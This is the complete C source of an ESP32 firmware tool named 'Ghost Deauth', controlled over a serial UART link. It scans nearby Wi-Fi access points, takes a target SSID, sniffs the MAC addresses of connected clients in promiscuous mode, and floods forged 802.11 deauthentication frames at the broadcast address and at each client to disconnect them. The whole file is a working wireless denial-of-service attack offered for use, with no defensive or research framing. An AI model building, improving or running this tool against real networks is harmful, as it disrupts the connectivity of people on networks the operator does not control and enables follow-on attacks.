#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "driver/uart.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_log.h"

// UART0 — communicates over USB (COM3)
#define UART_PORT      UART_NUM_0
#define UART_TX_PIN    UART_PIN_NO_CHANGE
#define UART_RX_PIN    UART_PIN_NO_CHANGE
#define UART_BAUD_RATE 115200
#define BUF_SIZE       1024

// Deauth frame burst — how many frames per target per cycle
#define DEAUTH_BURST   10

// 802.11 deauthentication frame template
// [frame control 2B][duration 2B][dst 6B][src 6B][bssid 6B][seq 2B][reason 2B]
static const uint8_t deauth_frame_template[] = {
    0xC0, 0x00,             // frame control: type=management, subtype=deauth
    0x00, 0x00,             // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // destination (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // source / BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled at runtime)
    0x00, 0x00,             // sequence control
    0x01, 0x00              // reason code 1: unspecified
};

// State shared between tasks
static bool          attack_running  = false;
static uint8_t       target_bssid[6] = {0};
static bool          target_found    = false;
static char          target_ssid[33] = {0};
static SemaphoreHandle_t state_mutex;

// Captured clients connected to the target AP
#define MAX_CLIENTS 32
static uint8_t clients[MAX_CLIENTS][6];
static int     client_count = 0;

// ── UART helpers ─────────────────────────────────────────────────────────────

void uart_init() {
    uart_config_t cfg = {
        .baud_rate = UART_BAUD_RATE,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
    };
    uart_driver_install(UART_PORT, BUF_SIZE * 2, 0, 0, NULL, 0);
    uart_param_config(UART_PORT, &cfg);
    uart_set_pin(UART_PORT, UART_TX_PIN, UART_RX_PIN,
                 UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);
}

void send(const char *msg) {
    uart_write_bytes(UART_PORT, msg, strlen(msg));
}

void sendf(const char *fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    send(buf);
    printf("%s", buf);
}

// ── WiFi init ─────────────────────────────────────────────────────────────────

void wifi_init() {
    nvs_flash_init();
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_sta();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
}

// ── AP scan — find BSSID for a given SSID ────────────────────────────────────

bool find_bssid_for_ssid(const char *ssid, uint8_t *bssid_out, uint8_t *channel_out) {
    wifi_scan_config_t scan_cfg = {
        .ssid        = NULL,
        .bssid       = NULL,
        .channel     = 0,
        .show_hidden = true,
    };
    esp_wifi_scan_start(&scan_cfg, true);

    uint16_t count = 0;
    esp_wifi_scan_get_ap_num(&count);
    if (count == 0) return false;

    wifi_ap_record_t *list = malloc(count * sizeof(wifi_ap_record_t));
    esp_wifi_scan_get_ap_records(&count, list);

    bool found = false;
    for (int i = 0; i < count; i++) {
        if (strcmp((char *)list[i].ssid, ssid) == 0) {
            memcpy(bssid_out, list[i].bssid, 6);
            *channel_out = list[i].primary;
            found = true;
            break;
        }
    }
    free(list);
    return found;
}

// ── Promiscuous callback — collect client MACs from data frames ───────────────

void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!attack_running) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;

    // Only interested in data frames (type bits 3:2 == 0b10)
    uint8_t frame_type = (frame[0] & 0x0C) >> 2;
    if (frame_type != 0x02) return;

    // addr1=dst, addr2=src, addr3=bssid for frames from client→AP
    // Check if addr3 matches our target BSSID
    const uint8_t *bssid_in_frame = frame + 16;
    if (memcmp(bssid_in_frame, target_bssid, 6) != 0) return;

    // addr2 is the client
    const uint8_t *client_mac = frame + 10;

    // Skip broadcast/multicast
    if (client_mac[0] & 0x01) return;

    // Skip if already tracked
    xSemaphoreTake(state_mutex, portMAX_DELAY);
    for (int i = 0; i < client_count; i++) {
        if (memcmp(clients[i], client_mac, 6) == 0) {
            xSemaphoreGive(state_mutex);
            return;
        }
    }
    if (client_count < MAX_CLIENTS) {
        memcpy(clients[client_count], client_mac, 6);
        client_count++;
        sendf("CLIENT:%02X:%02X:%02X:%02X:%02X:%02X\n",
              client_mac[0], client_mac[1], client_mac[2],
              client_mac[3], client_mac[4], client_mac[5]);
    }
    xSemaphoreGive(state_mutex);
}

// ── Send a single forged deauth frame ────────────────────────────────────────

void ghost_deauth(const uint8_t *dst, const uint8_t *bssid) {
    uint8_t frame[sizeof(deauth_frame_template)];
    memcpy(frame, deauth_frame_template, sizeof(frame));

    // Fill destination, source (= bssid), and bssid fields
    memcpy(frame + 4,  dst,   6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);

    // Send: interface 0 (STA), no ACK needed
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

// ── Deauth task — runs while attack_running is true ──────────────────────────

void deauth_task(void *arg) {
    while (1) {
        xSemaphoreTake(state_mutex, portMAX_DELAY);
        bool running = attack_running;
        xSemaphoreGive(state_mutex);

        if (!running) {
            vTaskDelay(100 / portTICK_PERIOD_MS);
            continue;
        }

        // Broadcast deauth — hits all clients at once
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        for (int i = 0; i < DEAUTH_BURST; i++) {
            ghost_deauth(broadcast, target_bssid);
        }

        // Also individually deauth each known client
        xSemaphoreTake(state_mutex, portMAX_DELAY);
        for (int c = 0; c < client_count; c++) {
            for (int i = 0; i < DEAUTH_BURST; i++) {
                ghost_deauth(clients[c], target_bssid);
            }
        }
        xSemaphoreGive(state_mutex);

        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

// ── Command handler ───────────────────────────────────────────────────────────

void handle_command(char *cmd) {
    // Strip newlines
    for (int i = 0; cmd[i]; i++) {
        if (cmd[i] == '\n' || cmd[i] == '\r') cmd[i] = 0;
    }
    printf("CMD: [%s]\n", cmd);

    if (strncmp(cmd, "CMD:SCAN_AP", 11) == 0) {
        // Reuse scan logic so the user can discover networks first
        send("SCAN:START\n");
        wifi_scan_config_t scan_cfg = {
            .ssid = NULL, .bssid = NULL, .channel = 0, .show_hidden = true
        };
        esp_wifi_scan_start(&scan_cfg, true);
        uint16_t count = 0;
        esp_wifi_scan_get_ap_num(&count);
        wifi_ap_record_t *list = malloc(count * sizeof(wifi_ap_record_t));
        esp_wifi_scan_get_ap_records(&count, list);
        char buf[128];
        for (int i = 0; i < count; i++) {
            snprintf(buf, sizeof(buf), "AP:%s,%02X:%02X:%02X:%02X:%02X:%02X,%d,%d\n",
                     (char *)list[i].ssid,
                     list[i].bssid[0], list[i].bssid[1], list[i].bssid[2],
                     list[i].bssid[3], list[i].bssid[4], list[i].bssid[5],
                     list[i].rssi, list[i].primary);
            send(buf);
            printf("%s", buf);
        }
        free(list);
        send("SCAN:DONE\n");

    } else if (strncmp(cmd, "CMD:DEAUTH:", 11) == 0) {
        char *ssid = cmd + 11;
        if (strlen(ssid) == 0) {
            send("ERR:NO_SSID\n");
            return;
        }

        // Stop any running attack first
        xSemaphoreTake(state_mutex, portMAX_DELAY);
        attack_running = false;
        target_found   = false;
        client_count   = 0;
        xSemaphoreGive(state_mutex);

        esp_wifi_set_promiscuous(false);

        sendf("DEAUTH:SCANNING_FOR:%s\n", ssid);

        uint8_t bssid[6];
        uint8_t channel;
        if (!find_bssid_for_ssid(ssid, bssid, &channel)) {
            sendf("ERR:SSID_NOT_FOUND:%s\n", ssid);
            return;
        }

        sendf("DEAUTH:FOUND:%s BSSID=%02X:%02X:%02X:%02X:%02X:%02X CH=%d\n",
              ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);

        xSemaphoreTake(state_mutex, portMAX_DELAY);
        memcpy(target_bssid, bssid, 6);
        strncpy(target_ssid, ssid, 32);
        target_found   = true;
        attack_running = true;
        xSemaphoreGive(state_mutex);

        // Lock onto target channel and enable promiscuous to discover clients
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
        esp_wifi_set_promiscuous(true);

        send("DEAUTH:STARTED\n");

    } else if (strncmp(cmd, "CMD:DEAUTH_STOP", 15) == 0) {
        xSemaphoreTake(state_mutex, portMAX_DELAY);
        attack_running = false;
        xSemaphoreGive(state_mutex);
        esp_wifi_set_promiscuous(false);
        send("DEAUTH:STOPPED\n");

    } else {
        send("ERR:UNKNOWN\n");
    }
}

// ── UART RX task ──────────────────────────────────────────────────────────────

void uart_rx_task(void *arg) {
    uint8_t data[BUF_SIZE];
    while (1) {
        int len = uart_read_bytes(UART_PORT, data, BUF_SIZE - 1, 20 / portTICK_PERIOD_MS);
        if (len > 0) {
            data[len] = 0;
            handle_command((char *)data);
        }
    }
}

// ── Entry point ───────────────────────────────────────────────────────────────

void app_main(void) {
    printf("Ghost Deauth booting...\n");

    state_mutex = xSemaphoreCreateMutex();

    uart_init();
    wifi_init();

    send("GHOST:READY\n");

    xTaskCreate(uart_rx_task, "uart_rx",   4096, NULL, 5, NULL);
    xTaskCreate(deauth_task,  "deauth_tx", 4096, NULL, 6, NULL);

    printf("Ghost Deauth ready. Send CMD:SCAN_AP then CMD:DEAUTH:<ssid>\n");
}
